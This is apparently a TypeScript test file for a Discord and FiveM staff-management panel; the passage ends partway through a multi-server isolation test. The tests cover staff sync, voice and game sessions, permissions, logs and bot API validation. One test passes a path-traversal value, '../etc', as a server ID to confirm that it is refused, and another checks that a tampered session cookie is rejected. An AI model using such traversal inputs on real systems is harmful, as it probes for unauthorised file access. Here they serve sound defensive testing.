import { test, before, after } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

// Each run gets its own throw-away SQLite file (libSQL local mode, same engine and SQL as Turso).
const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "gtasun-test-"));
delete process.env.TURSO_DATABASE_URL;
process.env.DATABASE_PATH = path.join(tmpDir, "test.sqlite");
process.env.CONFIG_CACHE_MS = "0"; // tests change config tables directly
process.env.APP_TIMEZONE = "Europe/Paris";
process.env.SESSION_SECRET = "x".repeat(40);
process.env.DISCORD_STAFF_ROLE_IDS = "r-mod,r-admin";
process.env.GRADE_ROLE_MAPPING_JSON = JSON.stringify({
  Moderator: { roleId: "r-mod", level: 2 },
  Admin: { roleId: "r-admin", level: 4 }
});
process.env.FIVEM_AGENT_TOKEN = "secret-token";
process.env.PANEL_OWNER_IDS = "900000000000000001";
// The legacy server ("default") is attached to this guild at startup, like an upgraded single-server install.
process.env.DISCORD_GUILD_ID = "500000000000000001";

type Mods = {
  sync: typeof import("../src/lib/sync");
  voice: typeof import("../src/lib/voice");
  fivem: typeof import("../src/lib/fivem");
  session: typeof import("../src/lib/session");
  grades: typeof import("../src/lib/grades");
  config: typeof import("../src/lib/config");
  db: typeof import("../src/lib/db");
  roles: typeof import("../src/lib/roles");
  report: typeof import("../src/lib/report");
  week: typeof import("../src/lib/week");
  status: typeof import("../src/lib/bot-status");
  playtime: typeof import("../src/lib/playtime");
  servers: typeof import("../src/lib/servers");
  agent: typeof import("../src/lib/agent");
  players: typeof import("../src/lib/players");
  security: typeof import("../src/lib/security");
  securityConfig: typeof import("../src/lib/security-config");
  networkShared: typeof import("../src/lib/network-shared");
  vision: typeof import("../src/lib/vision");
  live: typeof import("../src/lib/security-live");
  studio: typeof import("../src/lib/studio");
  shared: typeof import("../src/lib/studio-shared");
  zip: typeof import("../src/lib/zip");
  blocks: typeof import("../src/lib/studio-blocks");
  ui: typeof import("../src/lib/studio-ui");
  auditRules: typeof import("../src/lib/audit-rules");
  audit: typeof import("../src/lib/server-audit");
};
let m: Mods;
let db: Mods["db"]["db"];
/** The legacy server: existing data and env fallbacks (grade mapping, staff roles) belong to it. */
const S = "default";
const G = "500000000000000001";
const A = "100000000000000001";
const B = "100000000000000002";

before(async () => {
  m = {
    sync: await import("../src/lib/sync"),
    voice: await import("../src/lib/voice"),
    fivem: await import("../src/lib/fivem"),
    session: await import("../src/lib/session"),
    grades: await import("../src/lib/grades"),
    config: await import("../src/lib/config"),
    db: await import("../src/lib/db"),
    roles: await import("../src/lib/roles"),
    report: await import("../src/lib/report"),
    week: await import("../src/lib/week"),
    status: await import("../src/lib/bot-status"),
    playtime: await import("../src/lib/playtime"),
    servers: await import("../src/lib/servers"),
    agent: await import("../src/lib/agent"),
    players: await import("../src/lib/players"),
    security: await import("../src/lib/security"),
    securityConfig: await import("../src/lib/security-config"),
    networkShared: await import("../src/lib/network-shared"),
    vision: await import("../src/lib/vision"),
    live: await import("../src/lib/security-live"),
    studio: await import("../src/lib/studio"),
    shared: await import("../src/lib/studio-shared"),
    zip: await import("../src/lib/zip"),
    blocks: await import("../src/lib/studio-blocks"),
    ui: await import("../src/lib/studio-ui"),
    auditRules: await import("../src/lib/audit-rules"),
    audit: await import("../src/lib/server-audit")
  };
  db = m.db.db;
});

after(() => {
  try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch { /* Windows may keep the file locked */ }
});

const member = (discordId: string, roleIds: string[]) => ({
  discordId, username: `u${discordId.slice(-1)}`, avatarUrl: null, roleIds, joinedAt: null, presentInGuild: true
});
const stat = async (id: string) => (await m.sync.listStaffWithStats(S)).find((s) => s.discordId === id);

test("grade resolution: highest level wins, non-staff gets none", async () => {
  assert.deepEqual(await m.config.resolveGradeFromRoles(S, ["r-mod", "r-admin"]), { grade: "Admin", gradeLevel: 4, roleId: "r-admin" });
  assert.equal(await m.config.resolveGradeFromRoles(S, ["other"]), null);
});

test("hierarchy: cannot manage equal/higher or assign >= own level", () => {
  assert.equal(m.grades.canManageGrade(4, 2, 3), true);
  assert.equal(m.grades.canManageGrade(4, 4, 1), false);
  assert.equal(m.grades.canManageGrade(4, 2, 4), false);
});

test("sync inserts staff, ignores non-staff, marks left, keeps history", async () => {
  const r1 = await m.sync.syncStaffMembers(S, [member(A, ["r-admin"]), member(B, ["r-mod"]), member("100000000000000003", ["x"])]);
  assert.deepEqual([r1.inserted, r1.updated], [2, 0]);
  await db.run("INSERT INTO staff_notes (discord_id, body, author_discord_id) VALUES (?, 'n', ?)", [B, A]);
  const r2 = await m.sync.syncStaffMembers(S, [member(A, ["r-admin"])]);
  assert.equal(r2.markedLeft, 1);
  assert.equal((await m.sync.listStaffWithStats(S)).length, 1);
  // B returns: same row reactivated, note preserved.
  await m.sync.syncStaffMembers(S, [member(A, ["r-admin"]), member(B, ["r-mod"])]);
  const b = (await stat(B))!;
  assert.equal(b.notesCount, 1);
  assert.equal(b.grade, "Moderator");
});

test("voice sessions: open, move, close accumulate seconds; non-staff ignored", async () => {
  const t0 = new Date("2026-01-01T10:00:00Z");
  await m.voice.openVoiceSession(S, A, ["r-admin"], "c1", t0);
  assert.equal(await m.voice.isInVoiceNow(S, A), true);
  await m.voice.moveVoiceSession(S, A, ["r-admin"], "c2", new Date(t0.getTime() + 60_000));
  await m.voice.closeVoiceSession(S, A, new Date(t0.getTime() + 180_000));
  assert.equal(await m.voice.isInVoiceNow(S, A), false);
  assert.equal(await m.voice.voiceSecondsFor(S, A), 180);
  await m.voice.openVoiceSession(S, "999", ["nope"], "c1", t0);
  assert.equal(await m.voice.isInVoiceNow(S, "999"), false);
  assert.equal((await stat(A))!.voiceSeconds, 180);
});

test("fivem: legacy token, idempotent start, end computes seconds", async () => {
  assert.equal((await m.servers.serverForFivemToken("secret-token"))?.id, S); // legacy shared token -> legacy server
  assert.equal(await m.servers.serverForFivemToken("wrong-token!"), null);
  assert.equal(await m.servers.serverForFivemToken(null), null);
  const ts = Math.floor(Date.now() / 1000) - 600;
  const start = { event: "session_start" as const, discordId: A, sessionId: "s1", timestamp: ts };
  assert.deepEqual(await m.fivem.ingestFivemEvent(S, start), { ok: true, action: "opened" });
  assert.deepEqual(await m.fivem.ingestFivemEvent(S, start), { ok: true, action: "ignored" });
  assert.equal(await m.fivem.isInFivemNow(S, A), true);
  assert.deepEqual(await m.fivem.ingestFivemEvent(S, { ...start, event: "session_end", timestamp: ts + 300 }), { ok: true, action: "closed" });
  assert.equal((await stat(A))!.fivemSeconds, 300);
  assert.deepEqual(await m.fivem.ingestFivemEvent(S, { ...start, discordId: "555555555555555555", sessionId: "s2" }), { ok: true, action: "ignored" });
});

test("stale FiveM sessions are closed after the timeout", async () => {
  const old = new Date(Date.now() - 20 * 3600_000).toISOString();
  await db.run("INSERT INTO activity_sessions (discord_id, source, started_at, external_session_id, origin) VALUES (?, 'fivem', ?, 'stale-1', 'test')", [B, old]);
  assert.equal(await m.fivem.isInFivemNow(S, B), true);
  assert.equal(await m.fivem.closeStaleFivemSessions(12 * 3600), 1);
  assert.equal(await m.fivem.isInFivemNow(S, B), false);
  const row = await db.get<{ seconds: number }>("SELECT seconds FROM activity_sessions WHERE external_session_id = 'stale-1'");
  assert.equal(row!.seconds, 12 * 3600);
});

test("session cookie: roundtrip, tamper and expiry rejected; oauth state single-use", async () => {
  const tok = m.session.encodeSession({ discordId: A, username: "a", avatarUrl: null, roles: ["r-admin"] });
  assert.equal(m.session.decodeSession(tok)?.discordId, A);
  assert.equal(m.session.decodeSession(tok.slice(0, -2) + "xx"), null);
  await m.session.storeState("st1");
  assert.equal(await m.session.verifyAndConsumeState("st1"), true);
  assert.equal(await m.session.verifyAndConsumeState("st1"), false);
  assert.equal(await m.session.verifyAndConsumeState(null), false);
  // an expired state is refused
  await db.run("INSERT INTO oauth_states (state, created_at) VALUES ('old', datetime('now', '-20 minutes'))");
  assert.equal(await m.session.verifyAndConsumeState("old"), false);
});

test("panel access: seeded roles/users, owner, add/remove", async () => {
  const { hasPanelAccess } = m.config;
  assert.equal(await hasPanelAccess(S, "1243884102407422024", []), true); // seeded user
  assert.equal(await hasPanelAccess(S, "1130169424905785354", []), true);
  assert.equal(await hasPanelAccess(S, "5", ["1557788967414407229"]), true); // seeded role
  assert.equal(await hasPanelAccess(S, "5", ["1557788898497659012"]), true);
  assert.equal(await hasPanelAccess(S, "5", ["something-else"]), false);
  assert.equal(await hasPanelAccess(S, "900000000000000001", []), true); // owner from env
  await db.run("INSERT INTO panel_access (kind, discord_id) VALUES ('user', '777')");
  assert.equal(await hasPanelAccess(S, "777", []), true);
  await db.run("DELETE FROM panel_access WHERE discord_id = '777'");
  assert.equal(await hasPanelAccess(S, "777", []), false);
});

test("avert roles are detected by name and levels read from roles", async () => {
  await m.roles.storeGuildRoles(S, [
    { id: "w1", name: "Avert 1", position: 3, color: 0 },
    { id: "w2", name: "Avertissement 2", position: 4, color: 0 },
    { id: "w3", name: "avert 3", position: 5, color: 0 },
    { id: "other", name: "Autre", position: 6, color: 0 }
  ]);
  assert.deepEqual((await m.config.getWarnRoles(S)).map((w) => [w.level, w.roleId]), [[1, "w1"], [2, "w2"], [3, "w3"]]);
  assert.equal(await m.config.warnLevelFromRoles(S, ["w2", "x"]), 2);
  assert.equal(await m.config.warnLevelFromRoles(S, ["x"]), 0);
});

test("grade ladder from Discord positions when no env mapping", async () => {
  const saved = process.env.GRADE_ROLE_MAPPING_JSON;
  process.env.GRADE_ROLE_MAPPING_JSON = "{}";
  await m.roles.storeGuildRoles(S, [
    { id: "g-low", name: "Helper", position: 10, color: 0 },
    { id: "g-high", name: "Admin", position: 30, color: 0 },
    { id: "g-mid", name: "Mod", position: 20, color: 0 }
  ]);
  for (const id of ["g-high", "g-low", "g-mid"]) await db.run("INSERT OR IGNORE INTO grade_roles (role_id) VALUES (?)", [id]);
  assert.deepEqual((await m.config.getGradeLadder(S)).map((g) => [g.name, g.level]), [["Helper", 1], ["Mod", 2], ["Admin", 3]]);
  assert.equal((await m.config.resolveGradeFromRoles(S, ["g-mid", "g-low"]))?.grade, "Mod");
  assert.equal(await m.config.hasStaffRole(S, ["g-low"]), true);
  await db.run("DELETE FROM grade_roles");
  process.env.GRADE_ROLE_MAPPING_JSON = saved;
});

test("week range: Monday-based in Europe/Paris, whatever the server time zone", () => {
  // Wednesday 21 Oct 2026, 15:00 in Paris (CEST, UTC+2) = 13:00Z
  const now = new Date("2026-10-21T13:00:00Z");
  const cur = m.week.weekRange(0, now);
  assert.equal(cur.start.toISOString(), "2026-10-18T22:00:00.000Z"); // Monday 19 Oct 00:00 Paris
  assert.equal(cur.key, "2026-10-19");
  assert.equal(cur.label, "du 19/10 au 25/10");
  assert.equal(cur.partial, true);
  assert.equal(cur.end.getTime(), now.getTime());

  const prev = m.week.weekRange(1, now);
  assert.equal(prev.start.toISOString(), "2026-10-11T22:00:00.000Z");
  assert.equal(prev.partial, false);
  // The week of 19 Oct contains the autumn clock change (25 Oct): it ends Monday 26 Oct 00:00 CET = 23:00Z
  assert.equal(prev.end.toISOString(), "2026-10-18T22:00:00.000Z");
  assert.equal(m.week.weekRange(0, new Date("2026-10-26T10:00:00Z")).start.toISOString(), "2026-10-25T23:00:00.000Z");

  // Winter time (CET, UTC+1)
  const winter = m.week.weekRange(0, new Date("2026-11-04T12:00:00Z"));
  assert.equal(winter.start.toISOString(), "2026-11-01T23:00:00.000Z");
  // Sunday-evening window: 20:00 Paris = 18:00Z in summer
  assert.equal(m.week.isSundayFrom(20, new Date("2026-10-18T17:59:00Z")), false);
  assert.equal(m.week.isSundayFrom(20, new Date("2026-10-18T18:00:00Z")), true);
  assert.equal(m.week.isSundayFrom(20, new Date("2026-10-19T18:00:00Z")), false); // Monday
});

test("voice presence is only shown while the bot heartbeat is fresh", async () => {
  const t0 = new Date();
  await m.voice.openVoiceSession(S, B, ["r-mod"], "c9", t0);
  assert.equal((await stat(B))!.inVoice, false); // no heartbeat yet
  await m.status.setServerStatus(S, "heartbeat", new Date().toISOString());
  assert.equal((await stat(B))!.inVoice, true);
  await m.status.clearBotHeartbeat();
  assert.equal((await stat(B))!.inVoice, false);
  await m.voice.closeVoiceSession(S, B, new Date(t0.getTime() + 1000));
});

test("latest comment shows its author", async () => {
  await db.run("INSERT INTO staff_notes (discord_id, body, author_discord_id, author_name) VALUES (?, 'ok', ?, 'Chef')", [B, A]);
  const row = (await stat(B))!;
  assert.deepEqual([row.lastNote?.body, row.lastNote?.author], ["ok", "Chef"]);
});

test("permissions: migrated entries keep their rights, new ones get the basics, roles and users cumulate, owner has all", async () => {
  const perms = await import("../src/lib/permissions");
  const seeded = await m.config.getPermissions(S, "1243884102407422024", []);
  assert.ok(seeded.includes("rank_up") && seeded.includes("warn_add") && !seeded.includes("view_logs"));
  await db.run("INSERT INTO panel_access (kind, discord_id) VALUES ('user', '888')"); // no permissions value
  assert.deepEqual(await m.config.getPermissions(S, "888", []), perms.DEFAULT_NEW_PERMISSIONS);
  await db.run("INSERT INTO panel_access (kind, discord_id, permissions) VALUES ('role', 'r-logs', '[\"view_logs\"]')");
  const merged = await m.config.getPermissions(S, "888", ["r-logs"]);
  assert.ok(merged.includes("view_logs") && merged.includes("comment"));
  assert.equal((await m.config.getPermissions(S, "900000000000000001", [])).length, perms.ALL_PERMISSIONS.length);
  assert.deepEqual(await m.config.getPermissions(S, "nobody", []), []);
  await db.run("DELETE FROM panel_access WHERE discord_id IN ('888','r-logs')");
});

test("config snapshot is cached briefly and refreshed on invalidate", async () => {
  process.env.CONFIG_CACHE_MS = "60000";
  try {
    m.config.invalidateConfig();
    assert.equal(await m.config.hasPanelAccess(S, "4242", []), false);
    await db.run("INSERT INTO panel_access (kind, discord_id) VALUES ('user', '4242')");
    assert.equal(await m.config.hasPanelAccess(S, "4242", []), false); // still the cached view
    m.config.invalidateConfig();
    assert.equal(await m.config.hasPanelAccess(S, "4242", []), true);
  } finally {
    process.env.CONFIG_CACHE_MS = "0";
    await db.run("DELETE FROM panel_access WHERE discord_id = '4242'");
  }
});

test("logs: names, readable details, group filter and search", async () => {
  const { audit } = await import("../src/lib/audit");
  const { listLogs } = await import("../src/lib/logs");
  await audit(S, { discordId: A, username: "Chef" }, "rank_up", B, { from: "Helper", to: "Mod", reason: "bon boulot" });
  await audit(S, { discordId: A, username: "Chef" }, "rank_demote_failed", B, { discordStatus: 403 });
  await audit(S, { discordId: A, username: "Chef" }, "warn_add", B, { level: 2, reason: "retard" });
  const all = await listLogs(S, {});
  const up = all.rows.find((r) => r.action === "rank_up")!;
  assert.equal(up.actorName, "Chef");
  assert.equal(up.details, "Helper → Mod — « bon boulot »");
  assert.equal(up.tone, "up");
  const failed = await listLogs(S, { group: "failed" });
  assert.ok(failed.rows.every((r) => r.action.endsWith("_failed")) && failed.total >= 1);
  assert.match(failed.rows[0].details, /rôle du bot trop bas/);
  assert.ok((await listLogs(S, { group: "warnings" })).rows.every((r) => r.action.startsWith("warn")));
  assert.ok((await listLogs(S, { q: "chef" })).total >= 3);
  assert.equal((await listLogs(S, { q: "zzz-nobody" })).total, 0);
  assert.equal((await listLogs(S, { limit: 1, offset: 1 })).rows.length, 1);
});

test("AI review parsing tolerates fences and rejects bad ratings", async () => {
  const { parseReview } = await import("../src/lib/review");
  assert.deepEqual(parseReview('```json\n{"rating":"Green","summary":"Très présent."}\n```'), { rating: "green", summary: "Très présent." });
  assert.equal(parseReview('{"rating":"purple","summary":"x"}'), null);
  assert.equal(parseReview('{"rating":"red","summary":""}'), null);
  assert.equal(parseReview("pas de json"), null);
});

test("weekly review: AI summary + pastille per commented member, idempotent, batched, force replaces badge", async () => {
  const review = await import("../src/lib/review");
  process.env.AI_API_KEY = "test-key";
  let calls = 0;
  let verdict = "green";
  const realFetch = globalThis.fetch;
  globalThis.fetch = (async (_url: unknown, init?: { body?: string }) => {
    calls++;
    assert.match(String(init?.body), /Commentaires de la semaine/);
    return new Response(JSON.stringify({ choices: [{ message: { content: JSON.stringify({ rating: verdict, summary: "Bonne semaine." }) } }] }), { status: 200 });
  }) as typeof fetch;
  try {
    await db.run("INSERT INTO staff_notes (discord_id, body, author_discord_id, author_name) VALUES (?, 'Très actif', ?, 'Chef')", [A, B]);
    // two commented members (A and B): a budget of 1 leaves one for the next run
    const first = await review.generateWeeklyReviews(S, 0, { delayMs: 0, maxMembers: 1 });
    assert.ok(first.ok && first.generated === 1 && first.remaining === 1 && first.failed === 0);
    const second = await review.generateWeeklyReviews(S, 0, { delayMs: 0 });
    assert.ok(second.ok && second.generated === 1 && second.skipped === 1 && second.remaining === 0);
    const callsAfter = calls;
    const again = await review.generateWeeklyReviews(S, 0, { delayMs: 0 });
    assert.ok(again.ok && again.generated === 0 && again.skipped === 2);
    assert.equal(calls, callsAfter); // no AI call for already-reviewed members

    const key = m.week.weekKey(m.week.weekRange(0));
    assert.equal((await review.getReviews(S, key)).get(A)?.rating, "green");
    const active = async () => (await db.all<{ color: string }>("SELECT color FROM staff_badges WHERE discord_id = ? AND author_discord_id = 'ia' AND status = 'active'", [A])).map((b) => b.color);
    assert.deepEqual(await active(), ["green"]);

    verdict = "blue";
    await review.generateWeeklyReviews(S, 0, { delayMs: 0, force: true });
    assert.deepEqual(await active(), ["blue"]); // old AI badge resolved, only the new one is active

    // a held lock (another instance running) refuses a second run
    assert.equal(await m.status.tryAcquireLock("review:default", 60_000), true);
    assert.deepEqual(await review.generateWeeklyReviews(S, 0, { delayMs: 0 }), { ok: false, error: "already_running" });
    await m.status.releaseLock("review:default");
  } finally {
    globalThis.fetch = realFetch;
    delete process.env.AI_API_KEY;
  }
  assert.deepEqual(await review.generateWeeklyReviews(S, 0), { ok: false, error: "ai_not_configured" });
});

test("locks: exclusive, released, and a stale lock can be taken over", async () => {
  assert.equal(await m.status.tryAcquireLock("job", 60_000), true);
  assert.equal(await m.status.tryAcquireLock("job", 60_000), false);
  await m.status.releaseLock("job");
  assert.equal(await m.status.tryAcquireLock("job", 60_000), true);
  await db.run("UPDATE bot_status SET value = ? WHERE key = 'lock:job'", [new Date(Date.now() - 10 * 60_000).toISOString()]);
  assert.equal(await m.status.tryAcquireLock("job", 60_000), true); // expired: taken over
  await m.status.releaseLock("job");
});

test("FiveM playtime pushed by the bot: staff only, throttled snapshots, period = difference of snapshots", async () => {
  const pt = m.playtime;
  assert.equal(await pt.playtimeAvailable(S), false);
  assert.equal(await pt.getFivemPlaytimes(S), null);

  const t0 = new Date("2026-03-01T10:00:00Z");
  const first = await pt.storePlaytimeTotals(S, [{ discordId: A, seconds: 1000 }, { discordId: "999999999999999999", seconds: 5 }], t0);
  assert.deepEqual(first, { stored: 1, snapshot: true }); // non-staff ignored
  const soon = await pt.storePlaytimeTotals(S, [{ discordId: A, seconds: 1100 }], new Date(t0.getTime() + 10 * 60_000));
  assert.equal(soon.snapshot, false); // < 30 min since the last snapshot
  const later = await pt.storePlaytimeTotals(S, [{ discordId: A, seconds: 4600 }], new Date("2026-03-08T10:00:00Z"));
  assert.equal(later.snapshot, true);

  assert.equal((await pt.getFivemPlaytimes(S))!.get(A), 4600); // lifetime
  const week = await pt.getFivemPlaytimes(S, new Date("2026-03-01T10:00:00Z"), new Date("2026-03-08T10:00:00Z"));
  assert.equal(week!.get(A), 3600);
  // before any snapshot existed: the earliest one is the baseline
  assert.equal((await pt.getFivemPlaytimes(S, new Date("2026-01-01T00:00:00Z")))!.get(A), 3600);
  // the staff overview shows the database figure instead of agent sessions
  const stats = await import("../src/lib/stats");
  assert.equal((await stats.fivemSource(S)), "database");
  assert.equal((await stats.getStaffOverview(S, undefined, undefined, false)).find((s) => s.discordId === A)!.fivemSeconds, 4600);

  await db.run("DELETE FROM playtime_totals");
  await db.run("DELETE FROM playtime_snapshots");
});

test("counter reset: lists restart from zero, history and weekly reports are untouched, live sessions keep counting", async () => {
  const stats = await import("../src/lib/stats");
  const counters = await import("../src/lib/counters");
  const overview = async (apply = true) => (await stats.getStaffOverview(S, undefined, undefined, apply)).find((s) => s.discordId === A)!;

  // A already has 180s of voice history from an earlier test (started in 2026-01).
  const before = await overview();
  assert.ok(before.voiceSeconds >= 180);

  // a member currently in voice at the moment of the reset
  await m.status.setServerStatus(S, "heartbeat", new Date().toISOString());
  await m.voice.openVoiceSession(S, A, ["r-admin"], "c5", new Date(Date.now() - 5 * 60_000));
  const result = await counters.resetCounters(S, { discordId: A, username: "Chef" });
  assert.equal(result.restartedVoice, 1);
  assert.equal(result.fivemSnapshot, false); // no playtime pushed in this test

  const afterReset = await overview();
  assert.ok(afterReset.voiceSeconds < 5, `expected a fresh counter, got ${afterReset.voiceSeconds}`);
  assert.equal(afterReset.inVoice, true); // still in voice, now counting from the reset
  assert.ok((await overview(false)).voiceSeconds >= before.voiceSeconds); // history kept (weekly reports ignore the reset)
  assert.ok((await stats.getStaffOverview(S, new Date(Date.now() - 86400_000))).find((s) => s.discordId === A)!.voiceSeconds < 5);
  assert.ok(((await stats.countersSince(S, new Date(Date.now() + 1000))) as Date).getTime() > Date.now()); // never earlier than asked

  await m.voice.closeVoiceSession(S, A, new Date());
  await m.status.clearBotHeartbeat();
  await db.run("DELETE FROM bot_status WHERE key = 'default:counters_reset_at'");
});

test("voice reconcile: keeps live sessions, closes phantoms, reopens moved members, counts only real openings", async () => {
  const STAFF = "600000000000000001";
  const prev = process.env.DISCORD_STAFF_ROLE_IDS;
  process.env.DISCORD_STAFF_ROLE_IDS = `${prev},${STAFF}`;
  const [U1, U2, U3, U4, U5] = ["710000000000000001", "710000000000000002", "710000000000000003", "710000000000000004", "710000000000000005"];
  const C1 = "920000000000000001";
  const C2 = "920000000000000002";
  try {
    const t = new Date(Date.now() - 600_000);
    for (const u of [U1, U2, U3]) await m.voice.openVoiceSession(S, u, [STAFF], C1, t);
    const result = await m.voice.reconcileVoiceSessions(S, 
      [
        { discordId: U1, channelId: C1, roleIds: [STAFF] }, // unchanged
        { discordId: U2, channelId: C2, roleIds: [STAFF] }, // moved while the bot was away
        { discordId: U4, channelId: C1, roleIds: [STAFF] }, // joined unseen
        { discordId: U5, channelId: C1, roleIds: [] } // not staff: ignored
      ],
      new Date()
    );
    // U3 left (closed), U2 moved (closed + reopened), U4 opened
    assert.deepEqual(result, { closed: 2, opened: 2 });
    assert.equal(await m.voice.isInVoiceNow(S, U1), true);
    assert.equal(await m.voice.isInVoiceNow(S, U3), false);
    assert.equal(await m.voice.isInVoiceNow(S, U4), true);
    assert.equal(await m.voice.isInVoiceNow(S, U5), false);
    const u2 = await db.all<{ channel_id: string }>("SELECT channel_id FROM voice_sessions WHERE discord_id = ? AND ended_at IS NULL", [U2]);
    assert.deepEqual(u2.map((r) => r.channel_id), [C2]);
    await m.voice.closeAllVoiceSessions(new Date());
    assert.equal(await m.voice.isInVoiceNow(S, U1), false);
  } finally {
    process.env.DISCORD_STAFF_ROLE_IDS = prev;
  }
});

test("database: batches are atomic, migrations are idempotent and safe to run concurrently", async () => {
  await db.run("CREATE TABLE IF NOT EXISTS t_atomic (k TEXT PRIMARY KEY)");
  await assert.rejects(db.batch([
    m.db.stmt("INSERT INTO t_atomic (k) VALUES ('a')"),
    m.db.stmt("INSERT INTO t_atomic (k) VALUES ('a')") // duplicate: the whole batch must roll back
  ]));
  assert.equal((await db.get<{ n: number }>("SELECT COUNT(*) AS n FROM t_atomic"))!.n, 0);
  const results = await db.batch([m.db.stmt("INSERT INTO t_atomic (k) VALUES ('b')"), m.db.stmt("SELECT COUNT(*) AS n FROM t_atomic")]);
  assert.equal(results[0].changes, 1);
  assert.equal(results[1].rows[0].n, 1);
  await db.run("DROP TABLE t_atomic");

  const { runMigrations } = await import("../src/lib/migrations");
  const client = await m.db.rawClient();
  const before = (await client.execute("SELECT COUNT(*) AS n FROM schema_migrations")).rows[0].n;
  await Promise.all([runMigrations(client), runMigrations(client)]);
  assert.equal((await client.execute("SELECT COUNT(*) AS n FROM schema_migrations")).rows[0].n, before);
  assert.equal(Number(before), 27);
});

test("bot API: sync snapshot, member event, voice events, heartbeat, playtime, shutdown", async () => {
  const api = await import("../src/lib/bot-api");
  const guard = await import("../src/lib/bot-guard");

  // token check
  process.env.BOT_API_TOKEN = "bot-secret";
  assert.equal(guard.verifyBotToken("Bearer bot-secret"), true);
  assert.equal(guard.verifyBotToken("Bearer wrong-secret"), false);
  assert.equal(guard.verifyBotToken(null), false);
  delete process.env.BOT_API_TOKEN;
  assert.equal(guard.verifyBotToken("Bearer bot-secret"), false); // no token configured => nobody gets in

  const STAFF = "600000000000000001";
  const prevStaff = process.env.DISCORD_STAFF_ROLE_IDS;
  process.env.DISCORD_STAFF_ROLE_IDS = `${prevStaff},${STAFF}`;
  const NEW = "700000000000000001";
  const snapshot = api.syncSchema.parse({
    guildId: G,
    roles: [{ id: "800000000000000001", name: "Support", position: 5, color: 0 }],
    members: [
      { discordId: NEW, username: "Recrue", avatarUrl: null, roleIds: [STAFF], joinedAt: null },
      { discordId: "700000000000000002", username: "Visiteur", avatarUrl: null, roleIds: [], joinedAt: null }
    ],
    voice: [{ discordId: NEW, channelId: "900000000000000001", roleIds: [STAFF] }],
    topRolePosition: 12
  });
  const synced = await api.applySync(snapshot);
  assert.ok("members" in synced, "the legacy guild maps to the default server");
  assert.equal(synced.members.inserted >= 1, true);
  assert.equal(synced.voice.opened, 1);
  assert.equal(await m.voice.isInVoiceNow(S, NEW), true);
  assert.equal((await m.status.getBotStatus(S)).alive, true);
  assert.equal((await m.status.getBotStatus(S)).topRolePosition, 12);
  assert.ok((await m.roles.listGuildRoles(S)).some((r) => r.name === "Support"));

  // a visitor without staff role never becomes staff
  assert.equal(await stat("700000000000000002"), undefined);

  // voice events
  const CH2 = "900000000000000002";
  await api.applyVoice(api.voiceEventSchema.parse({ guildId: G, action: "move", discordId: NEW, channelId: CH2, roleIds: [STAFF] }));
  assert.equal(await m.voice.isInVoiceNow(S, NEW), true);
  await api.applyVoice(api.voiceEventSchema.parse({ guildId: G, action: "leave", discordId: NEW }));
  assert.equal(await m.voice.isInVoiceNow(S, NEW), false);
  await assert.rejects(api.applyVoice(api.voiceEventSchema.parse({ guildId: G, action: "join", discordId: NEW })));

  // playtime pushed by the bot: only staff are stored
  const played = await api.applyPlaytime(api.playtimeSchema.parse({ guildId: G, totals: [{ discordId: NEW, seconds: 60 }, { discordId: "700000000000000002", seconds: 9 }] }));
  assert.ok("stored" in played && played.stored === 1);
  await db.run("DELETE FROM playtime_totals");
  await db.run("DELETE FROM playtime_snapshots");

  // member left the guild
  await api.applyMember(api.memberSchema.parse({ guildId: G, discordId: NEW, username: "Recrue", avatarUrl: null, roleIds: [], joinedAt: null, present: false }));
  assert.equal(await stat(NEW), undefined);

  // shutdown closes sessions and drops the heartbeat
  await api.applyVoice(api.voiceEventSchema.parse({ guildId: G, action: "join", discordId: A, channelId: CH2, roleIds: [STAFF] }));
  assert.equal((await api.applyShutdown()).closed >= 1, true);
  assert.equal((await m.status.getBotStatus(S)).alive, false);

  // invalid payloads are rejected
  assert.equal(api.voiceEventSchema.safeParse({ action: "dance", discordId: NEW }).success, false);
  assert.equal(api.memberSchema.safeParse({ guildId: G, discordId: "abc", username: "x", avatarUrl: null, roleIds: [], joinedAt: null }).success, false);
  assert.equal(api.playtimeSchema.safeParse({ totals: [{ discordId: NEW, seconds: -1 }] }).success, false);
  process.env.DISCORD_STAFF_ROLE_IDS = prevStaff;
});

// ---------------------------------------------------------------- multi-server

const G2 = "500000000000000002";
const T_ROLE = "610000000000000001";

/** A second server ("Tango"), with its own guild, grade role and owner. A and B are (again) staff of the legacy server. */
async function tango() {
  await m.sync.syncStaffMembers(S, [member(A, ["r-admin"]), member(B, ["r-mod"])]);
  const existing = await m.servers.getServerByGuild(G2);
  if (existing) return existing;
  const created = await m.servers.createServer({ name: "Tango RP", guildId: G2, createdBy: "910000000000000001" });
  assert.ok(created.ok);
  await m.roles.storeGuildRoles(created.server.id, [{ id: T_ROLE, name: "Modo Tango", position: 3, color: 0 }]);
  await db.run("INSERT INTO grade_roles (role_id, server_id) VALUES (?, ?)", [T_ROLE, created.server.id]);
  return created.server;
}

test("servers: readable ids, creator is owner, one guild per server, legacy guild attached from env", async () => {
  assert.equal(m.servers.slugify("Gta Sun RP — Été"), "gta-sun-rp-ete");
  assert.match(m.servers.slugify("!!"), /^srv-[0-9a-f]{6}$/);
  const legacy = await m.servers.getServer(S);
  assert.equal(legacy?.guildId, G); // DISCORD_GUILD_ID of the single-server version
  const t = await tango();
  assert.equal(t.id, "tango-rp");
  assert.deepEqual(await m.servers.listServerOwners(t.id), ["910000000000000001"]);
  assert.deepEqual(await m.servers.createServer({ name: "Copie", guildId: G2, createdBy: A }), { ok: false, error: "guild_taken" });
  const twin = await m.servers.createServer({ name: "Tango RP", guildId: null, createdBy: A });
  assert.ok(twin.ok && twin.server.id.startsWith("tango-rp-") && twin.server.id !== t.id); // same name, distinct id
  assert.equal(await m.servers.getServer("../etc"), null); // ids are validated before any query
  assert.deepEqual(await m.servers.updateServer(twin.ok ? twin.server.id : "", { guildId: G2 }), { ok: false, error: "guild_taken" });
  assert.equal(m.servers.isValidTimeZone("America/Montreal"), true);
  assert.equal(m.servers.isValidTimeZone("Mars/Olympus"), false);
});

test("isolation: staff, grades, notes, voice and logs of one server never show on another", async () => {
  const t = await tango();
  // A is staff on both servers, with a different grade on each.
  await m.sync.syncStaffMembers(t.id, [member(A, [T_ROLE]), member(B, ["r-mod"])]);
  const onT = await m.sync.listStaffWithStats(t.id);
  assert.deepEqual(onT.map((x) => [x.discordId, x.grade]), [[A, "Modo Tango"]]); // r-mod (legacy env mapping) means nothing here
  assert.equal((await stat(A))!.grade, "Admin"); // unchanged on the legacy server

